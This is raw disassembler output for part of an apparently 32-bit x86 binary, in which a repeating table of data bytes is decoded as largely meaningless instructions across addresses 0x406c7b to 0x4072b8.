  406c7b:	12 13                	adc    (%ebx),%dl
  406c7d:	0e                   	push   %cs
  406c7e:	00 00                	add    %al,(%eax)
  406c80:	00 07                	add    %al,(%edi)
  406c82:	07                   	pop    %es
  406c83:	00 00                	add    %al,(%eax)
  406c85:	00 01                	add    %al,(%ecx)
	...
  406c8f:	11 01                	adc    %eax,(%ecx)
  406c91:	00 00                	add    %al,(%eax)
  406c93:	00 3a                	add    %bh,(%edx)
  406c95:	3a 00                	cmp    (%eax),%al
  406c97:	00 00                	add    %al,(%eax)
  406c99:	14 00                	adc    $0x0,%al
  406c9b:	00 00                	add    %al,(%eax)
  406c9d:	03 03                	add    (%ebx),%eax
  406c9f:	00 00                	add    %al,(%eax)
  406ca1:	00 15 01 00 00 00    	add    %dl,0x1
  406ca7:	3a 3a                	cmp    (%edx),%bh
  406ca9:	00 00                	add    %al,(%eax)
  406cab:	00 16                	add    %dl,(%esi)
  406cad:	17                   	pop    %ss
  406cae:	18 01                	sbb    %al,(%ecx)
  406cb0:	00 00                	add    %al,(%eax)
  406cb2:	00 b6 b6 00 00 00    	add    %dh,0xb6(%esi)
  406cb8:	12 13                	adc    (%ebx),%dl
  406cba:	0e                   	push   %cs
  406cbb:	00 00                	add    %al,(%eax)
  406cbd:	00 07                	add    %al,(%edi)
  406cbf:	07                   	pop    %es
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	00 01                	add    %al,(%ecx)
	...
  406ccc:	11 01                	adc    %eax,(%ecx)
  406cce:	00 00                	add    %al,(%eax)
  406cd0:	00 3b                	add    %bh,(%ebx)
  406cd2:	3b 00                	cmp    (%eax),%eax
  406cd4:	00 00                	add    %al,(%eax)
  406cd6:	14 00                	adc    $0x0,%al
  406cd8:	00 00                	add    %al,(%eax)
  406cda:	03 03                	add    (%ebx),%eax
  406cdc:	00 00                	add    %al,(%eax)
  406cde:	00 15 01 00 00 00    	add    %dl,0x1
  406ce4:	3b 3b                	cmp    (%ebx),%edi
  406ce6:	00 00                	add    %al,(%eax)
  406ce8:	00 16                	add    %dl,(%esi)
  406cea:	17                   	pop    %ss
  406ceb:	18 01                	sbb    %al,(%ecx)
  406ced:	00 00                	add    %al,(%eax)
  406cef:	00 2a                	add    %ch,(%edx)
  406cf1:	2a 00                	sub    (%eax),%al
  406cf3:	00 00                	add    %al,(%eax)
  406cf5:	12 13                	adc    (%ebx),%dl
  406cf7:	0e                   	push   %cs
  406cf8:	00 00                	add    %al,(%eax)
  406cfa:	00 07                	add    %al,(%edi)
  406cfc:	07                   	pop    %es
  406cfd:	00 00                	add    %al,(%eax)
  406cff:	00 01                	add    %al,(%ecx)
	...
  406d09:	11 01                	adc    %eax,(%ecx)
  406d0b:	00 00                	add    %al,(%eax)
  406d0d:	00 3c 3c             	add    %bh,(%esp,%edi,1)
  406d10:	00 00                	add    %al,(%eax)
  406d12:	00 14 00             	add    %dl,(%eax,%eax,1)
  406d15:	00 00                	add    %al,(%eax)
  406d17:	03 03                	add    (%ebx),%eax
  406d19:	00 00                	add    %al,(%eax)
  406d1b:	00 15 01 00 00 00    	add    %dl,0x1
  406d21:	3c 3c                	cmp    $0x3c,%al
  406d23:	00 00                	add    %al,(%eax)
  406d25:	00 16                	add    %dl,(%esi)
  406d27:	17                   	pop    %ss
  406d28:	18 01                	sbb    %al,(%ecx)
  406d2a:	00 00                	add    %al,(%eax)
  406d2c:	00 9c 9c 00 00 00 12 	add    %bl,0x12000000(%esp,%ebx,4)
  406d33:	13 0e                	adc    (%esi),%ecx
  406d35:	00 00                	add    %al,(%eax)
  406d37:	00 07                	add    %al,(%edi)
  406d39:	07                   	pop    %es
  406d3a:	00 00                	add    %al,(%eax)
  406d3c:	00 01                	add    %al,(%ecx)
	...
  406d46:	11 01                	adc    %eax,(%ecx)
  406d48:	00 00                	add    %al,(%eax)
  406d4a:	00 3d 3d 00 00 00    	add    %bh,0x3d
  406d50:	01 00                	add    %eax,(%eax)
  406d52:	00 00                	add    %al,(%eax)
  406d54:	0a 0a                	or     (%edx),%cl
  406d56:	00 00                	add    %al,(%eax)
  406d58:	00 01                	add    %al,(%ecx)
  406d5a:	00 00                	add    %al,(%eax)
  406d5c:	00 6b 6b             	add    %ch,0x6b(%ebx)
  406d5f:	00 00                	add    %al,(%eax)
  406d61:	00 12                	add    %dl,(%edx)
  406d63:	13 0e                	adc    (%esi),%ecx
  406d65:	00 00                	add    %al,(%eax)
  406d67:	00 07                	add    %al,(%edi)
  406d69:	07                   	pop    %es
  406d6a:	00 00                	add    %al,(%eax)
  406d6c:	00 01                	add    %al,(%ecx)
	...
  406d76:	11 01                	adc    %eax,(%ecx)
  406d78:	00 00                	add    %al,(%eax)
  406d7a:	00 3e                	add    %bh,(%esi)
  406d7c:	3e 00 00             	add    %al,%ds:(%eax)
  406d7f:	00 01                	add    %al,(%ecx)
  406d81:	00 00                	add    %al,(%eax)
  406d83:	00 19                	add    %bl,(%ecx)
  406d85:	19 00                	sbb    %eax,(%eax)
  406d87:	00 00                	add    %al,(%eax)
  406d89:	01 00                	add    %eax,(%eax)
  406d8b:	00 00                	add    %al,(%eax)
  406d8d:	77 77                	ja     0x406e06
  406d8f:	00 00                	add    %al,(%eax)
  406d91:	00 12                	add    %dl,(%edx)
  406d93:	13 0e                	adc    (%esi),%ecx
  406d95:	00 00                	add    %al,(%eax)
  406d97:	00 07                	add    %al,(%edi)
  406d99:	07                   	pop    %es
  406d9a:	00 00                	add    %al,(%eax)
  406d9c:	00 01                	add    %al,(%ecx)
	...
  406da6:	11 01                	adc    %eax,(%ecx)
  406da8:	00 00                	add    %al,(%eax)
  406daa:	00 3f                	add    %bh,(%edi)
  406dac:	3f                   	aas
  406dad:	00 00                	add    %al,(%eax)
  406daf:	00 01                	add    %al,(%ecx)
  406db1:	00 00                	add    %al,(%eax)
  406db3:	00 e5                	add    %ah,%ch
  406db5:	e5 00                	in     $0x0,%eax
  406db7:	00 00                	add    %al,(%eax)
  406db9:	01 00                	add    %eax,(%eax)
  406dbb:	00 00                	add    %al,(%eax)
  406dbd:	c5 c5 00             	(bad)
  406dc0:	00 00                	add    %al,(%eax)
  406dc2:	12 13                	adc    (%ebx),%dl
  406dc4:	0e                   	push   %cs
  406dc5:	00 00                	add    %al,(%eax)
  406dc7:	00 07                	add    %al,(%edi)
  406dc9:	07                   	pop    %es
  406dca:	00 00                	add    %al,(%eax)
  406dcc:	00 01                	add    %al,(%ecx)
	...
  406dd6:	11 01                	adc    %eax,(%ecx)
  406dd8:	00 00                	add    %al,(%eax)
  406dda:	00 40 40             	add    %al,0x40(%eax)
  406ddd:	00 00                	add    %al,(%eax)
  406ddf:	00 01                	add    %al,(%ecx)
  406de1:	00 00                	add    %al,(%eax)
  406de3:	00 ab ab 00 00 00    	add    %ch,0xab(%ebx)
  406de9:	01 00                	add    %eax,(%eax)
  406deb:	00 00                	add    %al,(%eax)
  406ded:	9c                   	pushf
  406dee:	9c                   	pushf
  406def:	00 00                	add    %al,(%eax)
  406df1:	00 12                	add    %dl,(%edx)
  406df3:	13 0e                	adc    (%esi),%ecx
  406df5:	00 00                	add    %al,(%eax)
  406df7:	00 07                	add    %al,(%edi)
  406df9:	07                   	pop    %es
  406dfa:	00 00                	add    %al,(%eax)
  406dfc:	00 01                	add    %al,(%ecx)
	...
  406e06:	11 01                	adc    %eax,(%ecx)
  406e08:	00 00                	add    %al,(%eax)
  406e0a:	00 41 41             	add    %al,0x41(%ecx)
  406e0d:	00 00                	add    %al,(%eax)
  406e0f:	00 01                	add    %al,(%ecx)
  406e11:	00 00                	add    %al,(%eax)
  406e13:	00 e7                	add    %ah,%bh
  406e15:	e7 00                	out    %eax,$0x0
  406e17:	00 00                	add    %al,(%eax)
  406e19:	01 00                	add    %eax,(%eax)
  406e1b:	00 00                	add    %al,(%eax)
  406e1d:	c7 c7 00 00 00 12    	mov    $0x12000000,%edi
  406e23:	13 0e                	adc    (%esi),%ecx
  406e25:	00 00                	add    %al,(%eax)
  406e27:	00 07                	add    %al,(%edi)
  406e29:	07                   	pop    %es
  406e2a:	00 00                	add    %al,(%eax)
  406e2c:	00 01                	add    %al,(%ecx)
	...
  406e36:	11 01                	adc    %eax,(%ecx)
  406e38:	00 00                	add    %al,(%eax)
  406e3a:	00 42 42             	add    %al,0x42(%edx)
  406e3d:	00 00                	add    %al,(%eax)
  406e3f:	00 01                	add    %al,(%ecx)
  406e41:	00 00                	add    %al,(%eax)
  406e43:	00 be be 00 00 00    	add    %bh,0xbe(%esi)
  406e49:	01 00                	add    %eax,(%eax)
  406e4b:	00 00                	add    %al,(%eax)
  406e4d:	da da                	fcmovu %st(2),%st
  406e4f:	00 00                	add    %al,(%eax)
  406e51:	00 12                	add    %dl,(%edx)
  406e53:	13 0e                	adc    (%esi),%ecx
  406e55:	00 00                	add    %al,(%eax)
  406e57:	00 07                	add    %al,(%edi)
  406e59:	07                   	pop    %es
  406e5a:	00 00                	add    %al,(%eax)
  406e5c:	00 01                	add    %al,(%ecx)
	...
  406e66:	11 01                	adc    %eax,(%ecx)
  406e68:	00 00                	add    %al,(%eax)
  406e6a:	00 43 43             	add    %al,0x43(%ebx)
  406e6d:	00 00                	add    %al,(%eax)
  406e6f:	00 14 00             	add    %dl,(%eax,%eax,1)
  406e72:	00 00                	add    %al,(%eax)
  406e74:	03 03                	add    (%ebx),%eax
  406e76:	00 00                	add    %al,(%eax)
  406e78:	00 15 01 00 00 00    	add    %dl,0x1
  406e7e:	43                   	inc    %ebx
  406e7f:	43                   	inc    %ebx
  406e80:	00 00                	add    %al,(%eax)
  406e82:	00 16                	add    %dl,(%esi)
  406e84:	17                   	pop    %ss
  406e85:	18 01                	sbb    %al,(%ecx)
  406e87:	00 00                	add    %al,(%eax)
  406e89:	00 fc                	add    %bh,%ah
  406e8b:	fc                   	cld
  406e8c:	00 00                	add    %al,(%eax)
  406e8e:	00 12                	add    %dl,(%edx)
  406e90:	13 0e                	adc    (%esi),%ecx
  406e92:	00 00                	add    %al,(%eax)
  406e94:	00 07                	add    %al,(%edi)
  406e96:	07                   	pop    %es
  406e97:	00 00                	add    %al,(%eax)
  406e99:	00 01                	add    %al,(%ecx)
	...
  406ea3:	11 01                	adc    %eax,(%ecx)
  406ea5:	00 00                	add    %al,(%eax)
  406ea7:	00 44 44 00          	add    %al,0x0(%esp,%eax,2)
  406eab:	00 00                	add    %al,(%eax)
  406ead:	14 00                	adc    $0x0,%al
  406eaf:	00 00                	add    %al,(%eax)
  406eb1:	03 03                	add    (%ebx),%eax
  406eb3:	00 00                	add    %al,(%eax)
  406eb5:	00 15 01 00 00 00    	add    %dl,0x1
  406ebb:	44                   	inc    %esp
  406ebc:	44                   	inc    %esp
  406ebd:	00 00                	add    %al,(%eax)
  406ebf:	00 16                	add    %dl,(%esi)
  406ec1:	17                   	pop    %ss
  406ec2:	18 01                	sbb    %al,(%ecx)
  406ec4:	00 00                	add    %al,(%eax)
  406ec6:	00 89 89 00 00 00    	add    %cl,0x89(%ecx)
  406ecc:	12 13                	adc    (%ebx),%dl
  406ece:	0e                   	push   %cs
  406ecf:	00 00                	add    %al,(%eax)
  406ed1:	00 07                	add    %al,(%edi)
  406ed3:	07                   	pop    %es
  406ed4:	00 00                	add    %al,(%eax)
  406ed6:	00 01                	add    %al,(%ecx)
	...
  406ee0:	11 01                	adc    %eax,(%ecx)
  406ee2:	00 00                	add    %al,(%eax)
  406ee4:	00 45 45             	add    %al,0x45(%ebp)
  406ee7:	00 00                	add    %al,(%eax)
  406ee9:	00 14 00             	add    %dl,(%eax,%eax,1)
  406eec:	00 00                	add    %al,(%eax)
  406eee:	03 03                	add    (%ebx),%eax
  406ef0:	00 00                	add    %al,(%eax)
  406ef2:	00 15 01 00 00 00    	add    %dl,0x1
  406ef8:	45                   	inc    %ebp
  406ef9:	45                   	inc    %ebp
  406efa:	00 00                	add    %al,(%eax)
  406efc:	00 16                	add    %dl,(%esi)
  406efe:	17                   	pop    %ss
  406eff:	18 01                	sbb    %al,(%ecx)
  406f01:	00 00                	add    %al,(%eax)
  406f03:	00 10                	add    %dl,(%eax)
  406f05:	10 00                	adc    %al,(%eax)
  406f07:	00 00                	add    %al,(%eax)
  406f09:	12 13                	adc    (%ebx),%dl
  406f0b:	0e                   	push   %cs
  406f0c:	00 00                	add    %al,(%eax)
  406f0e:	00 07                	add    %al,(%edi)
  406f10:	07                   	pop    %es
  406f11:	00 00                	add    %al,(%eax)
  406f13:	00 01                	add    %al,(%ecx)
	...
  406f1d:	11 01                	adc    %eax,(%ecx)
  406f1f:	00 00                	add    %al,(%eax)
  406f21:	00 46 46             	add    %al,0x46(%esi)
  406f24:	00 00                	add    %al,(%eax)
  406f26:	00 14 00             	add    %dl,(%eax,%eax,1)
  406f29:	00 00                	add    %al,(%eax)
  406f2b:	03 03                	add    (%ebx),%eax
  406f2d:	00 00                	add    %al,(%eax)
  406f2f:	00 15 01 00 00 00    	add    %dl,0x1
  406f35:	46                   	inc    %esi
  406f36:	46                   	inc    %esi
  406f37:	00 00                	add    %al,(%eax)
  406f39:	00 16                	add    %dl,(%esi)
  406f3b:	17                   	pop    %ss
  406f3c:	18 01                	sbb    %al,(%ecx)
  406f3e:	00 00                	add    %al,(%eax)
  406f40:	00 ec                	add    %ch,%ah
  406f42:	ec                   	in     (%dx),%al
  406f43:	00 00                	add    %al,(%eax)
  406f45:	00 12                	add    %dl,(%edx)
  406f47:	13 0e                	adc    (%esi),%ecx
  406f49:	00 00                	add    %al,(%eax)
  406f4b:	00 07                	add    %al,(%edi)
  406f4d:	07                   	pop    %es
  406f4e:	00 00                	add    %al,(%eax)
  406f50:	00 01                	add    %al,(%ecx)
	...
  406f5a:	11 01                	adc    %eax,(%ecx)
  406f5c:	00 00                	add    %al,(%eax)
  406f5e:	00 47 47             	add    %al,0x47(%edi)
  406f61:	00 00                	add    %al,(%eax)
  406f63:	00 14 00             	add    %dl,(%eax,%eax,1)
  406f66:	00 00                	add    %al,(%eax)
  406f68:	03 03                	add    (%ebx),%eax
  406f6a:	00 00                	add    %al,(%eax)
  406f6c:	00 15 01 00 00 00    	add    %dl,0x1
  406f72:	47                   	inc    %edi
  406f73:	47                   	inc    %edi
  406f74:	00 00                	add    %al,(%eax)
  406f76:	00 16                	add    %dl,(%esi)
  406f78:	17                   	pop    %ss
  406f79:	18 01                	sbb    %al,(%ecx)
  406f7b:	00 00                	add    %al,(%eax)
  406f7d:	00 f7                	add    %dh,%bh
  406f7f:	f7 00 00 00 12 13    	testl  $0x13120000,(%eax)
  406f85:	0e                   	push   %cs
  406f86:	00 00                	add    %al,(%eax)
  406f88:	00 07                	add    %al,(%edi)
  406f8a:	07                   	pop    %es
  406f8b:	00 00                	add    %al,(%eax)
  406f8d:	00 01                	add    %al,(%ecx)
	...
  406f97:	11 01                	adc    %eax,(%ecx)
  406f99:	00 00                	add    %al,(%eax)
  406f9b:	00 48 48             	add    %cl,0x48(%eax)
  406f9e:	00 00                	add    %al,(%eax)
  406fa0:	00 14 00             	add    %dl,(%eax,%eax,1)
  406fa3:	00 00                	add    %al,(%eax)
  406fa5:	03 03                	add    (%ebx),%eax
  406fa7:	00 00                	add    %al,(%eax)
  406fa9:	00 15 01 00 00 00    	add    %dl,0x1
  406faf:	48                   	dec    %eax
  406fb0:	48                   	dec    %eax
  406fb1:	00 00                	add    %al,(%eax)
  406fb3:	00 16                	add    %dl,(%esi)
  406fb5:	17                   	pop    %ss
  406fb6:	18 01                	sbb    %al,(%ecx)
  406fb8:	00 00                	add    %al,(%eax)
  406fba:	00 12                	add    %dl,(%edx)
  406fbc:	12 00                	adc    (%eax),%al
  406fbe:	00 00                	add    %al,(%eax)
  406fc0:	12 13                	adc    (%ebx),%dl
  406fc2:	0e                   	push   %cs
  406fc3:	00 00                	add    %al,(%eax)
  406fc5:	00 07                	add    %al,(%edi)
  406fc7:	07                   	pop    %es
  406fc8:	00 00                	add    %al,(%eax)
  406fca:	00 01                	add    %al,(%ecx)
	...
  406fd4:	11 01                	adc    %eax,(%ecx)
  406fd6:	00 00                	add    %al,(%eax)
  406fd8:	00 49 49             	add    %cl,0x49(%ecx)
  406fdb:	00 00                	add    %al,(%eax)
  406fdd:	00 14 00             	add    %dl,(%eax,%eax,1)
  406fe0:	00 00                	add    %al,(%eax)
  406fe2:	03 03                	add    (%ebx),%eax
  406fe4:	00 00                	add    %al,(%eax)
  406fe6:	00 15 01 00 00 00    	add    %dl,0x1
  406fec:	49                   	dec    %ecx
  406fed:	49                   	dec    %ecx
  406fee:	00 00                	add    %al,(%eax)
  406ff0:	00 16                	add    %dl,(%esi)
  406ff2:	17                   	pop    %ss
  406ff3:	18 01                	sbb    %al,(%ecx)
  406ff5:	00 00                	add    %al,(%eax)
  406ff7:	00 2b                	add    %ch,(%ebx)
  406ff9:	2b 00                	sub    (%eax),%eax
  406ffb:	00 00                	add    %al,(%eax)
  406ffd:	12 13                	adc    (%ebx),%dl
  406fff:	0e                   	push   %cs
  407000:	00 00                	add    %al,(%eax)
  407002:	00 07                	add    %al,(%edi)
  407004:	07                   	pop    %es
  407005:	00 00                	add    %al,(%eax)
  407007:	00 01                	add    %al,(%ecx)
	...
  407011:	11 01                	adc    %eax,(%ecx)
  407013:	00 00                	add    %al,(%eax)
  407015:	00 4a 4a             	add    %cl,0x4a(%edx)
  407018:	00 00                	add    %al,(%eax)
  40701a:	00 14 00             	add    %dl,(%eax,%eax,1)
  40701d:	00 00                	add    %al,(%eax)
  40701f:	03 03                	add    (%ebx),%eax
  407021:	00 00                	add    %al,(%eax)
  407023:	00 15 01 00 00 00    	add    %dl,0x1
  407029:	4a                   	dec    %edx
  40702a:	4a                   	dec    %edx
  40702b:	00 00                	add    %al,(%eax)
  40702d:	00 16                	add    %dl,(%esi)
  40702f:	17                   	pop    %ss
  407030:	18 01                	sbb    %al,(%ecx)
  407032:	00 00                	add    %al,(%eax)
  407034:	00 72 72             	add    %dh,0x72(%edx)
  407037:	00 00                	add    %al,(%eax)
  407039:	00 12                	add    %dl,(%edx)
  40703b:	13 0e                	adc    (%esi),%ecx
  40703d:	00 00                	add    %al,(%eax)
  40703f:	00 07                	add    %al,(%edi)
  407041:	07                   	pop    %es
  407042:	00 00                	add    %al,(%eax)
  407044:	00 01                	add    %al,(%ecx)
	...
  40704e:	11 01                	adc    %eax,(%ecx)
  407050:	00 00                	add    %al,(%eax)
  407052:	00 4b 4b             	add    %cl,0x4b(%ebx)
  407055:	00 00                	add    %al,(%eax)
  407057:	00 14 00             	add    %dl,(%eax,%eax,1)
  40705a:	00 00                	add    %al,(%eax)
  40705c:	03 03                	add    (%ebx),%eax
  40705e:	00 00                	add    %al,(%eax)
  407060:	00 15 01 00 00 00    	add    %dl,0x1
  407066:	4b                   	dec    %ebx
  407067:	4b                   	dec    %ebx
  407068:	00 00                	add    %al,(%eax)
  40706a:	00 16                	add    %dl,(%esi)
  40706c:	17                   	pop    %ss
  40706d:	18 01                	sbb    %al,(%ecx)
  40706f:	00 00                	add    %al,(%eax)
  407071:	00 a4 a4 00 00 00 12 	add    %ah,0x12000000(%esp,%eiz,4)
  407078:	13 0e                	adc    (%esi),%ecx
  40707a:	00 00                	add    %al,(%eax)
  40707c:	00 07                	add    %al,(%edi)
  40707e:	07                   	pop    %es
  40707f:	00 00                	add    %al,(%eax)
  407081:	00 01                	add    %al,(%ecx)
	...
  40708b:	11 01                	adc    %eax,(%ecx)
  40708d:	00 00                	add    %al,(%eax)
  40708f:	00 4c 4c 00          	add    %cl,0x0(%esp,%ecx,2)
  407093:	00 00                	add    %al,(%eax)
  407095:	01 00                	add    %eax,(%eax)
  407097:	00 00                	add    %al,(%eax)
  407099:	1f                   	pop    %ds
  40709a:	1f                   	pop    %ds
  40709b:	00 00                	add    %al,(%eax)
  40709d:	00 01                	add    %al,(%ecx)
  40709f:	00 00                	add    %al,(%eax)
  4070a1:	00 5d 5d             	add    %bl,0x5d(%ebp)
  4070a4:	00 00                	add    %al,(%eax)
  4070a6:	00 12                	add    %dl,(%edx)
  4070a8:	13 0e                	adc    (%esi),%ecx
  4070aa:	00 00                	add    %al,(%eax)
  4070ac:	00 07                	add    %al,(%edi)
  4070ae:	07                   	pop    %es
  4070af:	00 00                	add    %al,(%eax)
  4070b1:	00 01                	add    %al,(%ecx)
	...
  4070bb:	11 01                	adc    %eax,(%ecx)
  4070bd:	00 00                	add    %al,(%eax)
  4070bf:	00 4d 4d             	add    %cl,0x4d(%ebp)
  4070c2:	00 00                	add    %al,(%eax)
  4070c4:	00 14 00             	add    %dl,(%eax,%eax,1)
  4070c7:	00 00                	add    %al,(%eax)
  4070c9:	03 03                	add    (%ebx),%eax
  4070cb:	00 00                	add    %al,(%eax)
  4070cd:	00 15 01 00 00 00    	add    %dl,0x1
  4070d3:	4d                   	dec    %ebp
  4070d4:	4d                   	dec    %ebp
  4070d5:	00 00                	add    %al,(%eax)
  4070d7:	00 16                	add    %dl,(%esi)
  4070d9:	17                   	pop    %ss
  4070da:	18 01                	sbb    %al,(%ecx)
  4070dc:	00 00                	add    %al,(%eax)
  4070de:	00 49 49             	add    %cl,0x49(%ecx)
  4070e1:	00 00                	add    %al,(%eax)
  4070e3:	00 12                	add    %dl,(%edx)
  4070e5:	13 0e                	adc    (%esi),%ecx
  4070e7:	00 00                	add    %al,(%eax)
  4070e9:	00 07                	add    %al,(%edi)
  4070eb:	07                   	pop    %es
  4070ec:	00 00                	add    %al,(%eax)
  4070ee:	00 01                	add    %al,(%ecx)
	...
  4070f8:	11 01                	adc    %eax,(%ecx)
  4070fa:	00 00                	add    %al,(%eax)
  4070fc:	00 4e 4e             	add    %cl,0x4e(%esi)
  4070ff:	00 00                	add    %al,(%eax)
  407101:	00 01                	add    %al,(%ecx)
  407103:	00 00                	add    %al,(%eax)
  407105:	00 e9                	add    %ch,%cl
  407107:	e9 00 00 00 01       	jmp    0x140710c
  40710c:	00 00                	add    %al,(%eax)
  40710e:	00 90 90 00 00 00    	add    %dl,0x90(%eax)
  407114:	12 13                	adc    (%ebx),%dl
  407116:	0e                   	push   %cs
  407117:	00 00                	add    %al,(%eax)
  407119:	00 07                	add    %al,(%edi)
  40711b:	07                   	pop    %es
  40711c:	00 00                	add    %al,(%eax)
  40711e:	00 01                	add    %al,(%ecx)
	...
  407128:	11 01                	adc    %eax,(%ecx)
  40712a:	00 00                	add    %al,(%eax)
  40712c:	00 4f 4f             	add    %cl,0x4f(%edi)
  40712f:	00 00                	add    %al,(%eax)
  407131:	00 14 00             	add    %dl,(%eax,%eax,1)
  407134:	00 00                	add    %al,(%eax)
  407136:	03 03                	add    (%ebx),%eax
  407138:	00 00                	add    %al,(%eax)
  40713a:	00 15 01 00 00 00    	add    %dl,0x1
  407140:	4f                   	dec    %edi
  407141:	4f                   	dec    %edi
  407142:	00 00                	add    %al,(%eax)
  407144:	00 16                	add    %dl,(%esi)
  407146:	17                   	pop    %ss
  407147:	18 01                	sbb    %al,(%ecx)
  407149:	00 00                	add    %al,(%eax)
  40714b:	00 0d 0d 00 00 00    	add    %cl,0xd
  407151:	12 13                	adc    (%ebx),%dl
  407153:	0e                   	push   %cs
  407154:	00 00                	add    %al,(%eax)
  407156:	00 07                	add    %al,(%edi)
  407158:	07                   	pop    %es
  407159:	00 00                	add    %al,(%eax)
  40715b:	00 01                	add    %al,(%ecx)
	...
  407165:	11 01                	adc    %eax,(%ecx)
  407167:	00 00                	add    %al,(%eax)
  407169:	00 50 50             	add    %dl,0x50(%eax)
  40716c:	00 00                	add    %al,(%eax)
  40716e:	00 14 00             	add    %dl,(%eax,%eax,1)
  407171:	00 00                	add    %al,(%eax)
  407173:	03 03                	add    (%ebx),%eax
  407175:	00 00                	add    %al,(%eax)
  407177:	00 15 01 00 00 00    	add    %dl,0x1
  40717d:	50                   	push   %eax
  40717e:	50                   	push   %eax
  40717f:	00 00                	add    %al,(%eax)
  407181:	00 16                	add    %dl,(%esi)
  407183:	17                   	pop    %ss
  407184:	18 01                	sbb    %al,(%ecx)
  407186:	00 00                	add    %al,(%eax)
  407188:	00 8b 8b 00 00 00    	add    %cl,0x8b(%ebx)
  40718e:	12 13                	adc    (%ebx),%dl
  407190:	0e                   	push   %cs
  407191:	00 00                	add    %al,(%eax)
  407193:	00 07                	add    %al,(%edi)
  407195:	07                   	pop    %es
  407196:	00 00                	add    %al,(%eax)
  407198:	00 01                	add    %al,(%ecx)
	...
  4071a2:	11 01                	adc    %eax,(%ecx)
  4071a4:	00 00                	add    %al,(%eax)
  4071a6:	00 51 51             	add    %dl,0x51(%ecx)
  4071a9:	00 00                	add    %al,(%eax)
  4071ab:	00 01                	add    %al,(%ecx)
  4071ad:	00 00                	add    %al,(%eax)
  4071af:	00 46 46             	add    %al,0x46(%esi)
  4071b2:	00 00                	add    %al,(%eax)
  4071b4:	00 01                	add    %al,(%ecx)
  4071b6:	00 00                	add    %al,(%eax)
  4071b8:	00 33                	add    %dh,(%ebx)
  4071ba:	33 00                	xor    (%eax),%eax
  4071bc:	00 00                	add    %al,(%eax)
  4071be:	12 13                	adc    (%ebx),%dl
  4071c0:	0e                   	push   %cs
  4071c1:	00 00                	add    %al,(%eax)
  4071c3:	00 07                	add    %al,(%edi)
  4071c5:	07                   	pop    %es
  4071c6:	00 00                	add    %al,(%eax)
  4071c8:	00 01                	add    %al,(%ecx)
	...
  4071d2:	11 01                	adc    %eax,(%ecx)
  4071d4:	00 00                	add    %al,(%eax)
  4071d6:	00 52 52             	add    %dl,0x52(%edx)
  4071d9:	00 00                	add    %al,(%eax)
  4071db:	00 01                	add    %al,(%ecx)
  4071dd:	00 00                	add    %al,(%eax)
  4071df:	00 12                	add    %dl,(%edx)
  4071e1:	12 00                	adc    (%eax),%al
  4071e3:	00 00                	add    %al,(%eax)
  4071e5:	01 00                	add    %eax,(%eax)
  4071e7:	00 00                	add    %al,(%eax)
  4071e9:	7e 7e                	jle    0x407269
  4071eb:	00 00                	add    %al,(%eax)
  4071ed:	00 12                	add    %dl,(%edx)
  4071ef:	13 0e                	adc    (%esi),%ecx
  4071f1:	00 00                	add    %al,(%eax)
  4071f3:	00 07                	add    %al,(%edi)
  4071f5:	07                   	pop    %es
  4071f6:	00 00                	add    %al,(%eax)
  4071f8:	00 01                	add    %al,(%ecx)
	...
  407202:	11 01                	adc    %eax,(%ecx)
  407204:	00 00                	add    %al,(%eax)
  407206:	00 53 53             	add    %dl,0x53(%ebx)
  407209:	00 00                	add    %al,(%eax)
  40720b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40720e:	00 00                	add    %al,(%eax)
  407210:	03 03                	add    (%ebx),%eax
  407212:	00 00                	add    %al,(%eax)
  407214:	00 15 01 00 00 00    	add    %dl,0x1
  40721a:	53                   	push   %ebx
  40721b:	53                   	push   %ebx
  40721c:	00 00                	add    %al,(%eax)
  40721e:	00 16                	add    %dl,(%esi)
  407220:	17                   	pop    %ss
  407221:	18 01                	sbb    %al,(%ecx)
  407223:	00 00                	add    %al,(%eax)
  407225:	00 69 69             	add    %ch,0x69(%ecx)
  407228:	00 00                	add    %al,(%eax)
  40722a:	00 12                	add    %dl,(%edx)
  40722c:	13 0e                	adc    (%esi),%ecx
  40722e:	00 00                	add    %al,(%eax)
  407230:	00 07                	add    %al,(%edi)
  407232:	07                   	pop    %es
  407233:	00 00                	add    %al,(%eax)
  407235:	00 01                	add    %al,(%ecx)
	...
  40723f:	11 01                	adc    %eax,(%ecx)
  407241:	00 00                	add    %al,(%eax)
  407243:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  407247:	00 00                	add    %al,(%eax)
  407249:	01 00                	add    %eax,(%eax)
  40724b:	00 00                	add    %al,(%eax)
  40724d:	8f                   	(bad)
  40724e:	8f 00                	pop    (%eax)
  407250:	00 00                	add    %al,(%eax)
  407252:	01 00                	add    %eax,(%eax)
  407254:	00 00                	add    %al,(%eax)
  407256:	af                   	scas   %es:(%edi),%eax
  407257:	af                   	scas   %es:(%edi),%eax
  407258:	00 00                	add    %al,(%eax)
  40725a:	00 12                	add    %dl,(%edx)
  40725c:	13 0e                	adc    (%esi),%ecx
  40725e:	00 00                	add    %al,(%eax)
  407260:	00 07                	add    %al,(%edi)
  407262:	07                   	pop    %es
  407263:	00 00                	add    %al,(%eax)
  407265:	00 01                	add    %al,(%ecx)
	...
  40726f:	11 01                	adc    %eax,(%ecx)
  407271:	00 00                	add    %al,(%eax)
  407273:	00 55 55             	add    %dl,0x55(%ebp)
  407276:	00 00                	add    %al,(%eax)
  407278:	00 01                	add    %al,(%ecx)
  40727a:	00 00                	add    %al,(%eax)
  40727c:	00 e9                	add    %ch,%cl
  40727e:	e9 00 00 00 01       	jmp    0x1407283
  407283:	00 00                	add    %al,(%eax)
  407285:	00 9f 9f 00 00 00    	add    %bl,0x9f(%edi)
  40728b:	12 13                	adc    (%ebx),%dl
  40728d:	0e                   	push   %cs
  40728e:	00 00                	add    %al,(%eax)
  407290:	00 07                	add    %al,(%edi)
  407292:	07                   	pop    %es
  407293:	00 00                	add    %al,(%eax)
  407295:	00 01                	add    %al,(%ecx)
	...
  40729f:	11 01                	adc    %eax,(%ecx)
  4072a1:	00 00                	add    %al,(%eax)
  4072a3:	00 56 56             	add    %dl,0x56(%esi)
  4072a6:	00 00                	add    %al,(%eax)
  4072a8:	00 01                	add    %al,(%ecx)
  4072aa:	00 00                	add    %al,(%eax)
  4072ac:	00 b2 b2 00 00 00    	add    %dh,0xb2(%edx)
  4072b2:	01 00                	add    %eax,(%eax)
  4072b4:	00 00                	add    %al,(%eax)
  4072b6:	d7                   	xlat   %ds:(%ebx)
  4072b7:	d7                   	xlat   %ds:(%ebx)
  4072b8:	00 00                	add    %al,(%eax)
